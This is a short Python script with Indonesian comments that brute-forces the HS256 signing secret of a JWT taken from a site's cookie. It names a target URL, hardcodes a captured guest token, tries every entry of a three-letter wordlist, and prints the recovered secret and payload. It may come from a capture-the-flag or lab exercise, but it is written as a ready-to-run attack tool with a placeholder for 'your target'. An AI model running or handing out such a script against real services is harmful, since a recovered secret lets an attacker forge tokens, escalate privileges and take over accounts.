import jwt
import requests

# URL target
url = "http://pina.infy.uk/"  # Ganti dengan URL target Anda

# Ambil cookie JWT dari respons server
cookies = {
    "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJyb2xlIjoiZ3Vlc3QxMjMiLCJpYXQiOjE3Mzc4OTkxMjEsImV4cCI6MTczNzkwMjcyMX0.7Lxw0cLYxrxbAL3pohur2l4Te6gmvWfXpGYCzyyUGLE"  # Ganti dengan nilai JWT Anda
}

# Fungsi untuk brute-force secret key
def brute_force_jwt(wordlist_file, jwt_token):
    with open(wordlist_file, 'r') as file:
        for secret in file:
            secret = secret.strip()
            try:
                # Decode JWT menggunakan secret
                payload = jwt.decode(jwt_token, secret, algorithms=["HS256"])
                print(f"[+] Secret ditemukan: {secret}")
                print(f"[+] Payload JWT: {payload}")
                return secret
            except jwt.exceptions.InvalidSignatureError:
                pass  # Abaikan jika signature tidak valid
            except jwt.exceptions.DecodeError:
                pass  # Abaikan jika format JWT salah
    print("[-] Secret key tidak ditemukan.")
    return None

# Lokasi wordlist (gunakan wordlist yang telah dibuat)
wordlist_file = "wordlist_3_huruf.txt"

# Masukkan JWT dari cookie
jwt_token = cookies["jwt"]

# Jalankan brute-force
secret_key = brute_force_jwt(wordlist_file, jwt_token)

if secret_key:
    print(f"[SUCCESS] Secret key ditemukan: {secret_key}")
else:
    print("[FAILED] Tidak dapat menemukan secret key.")

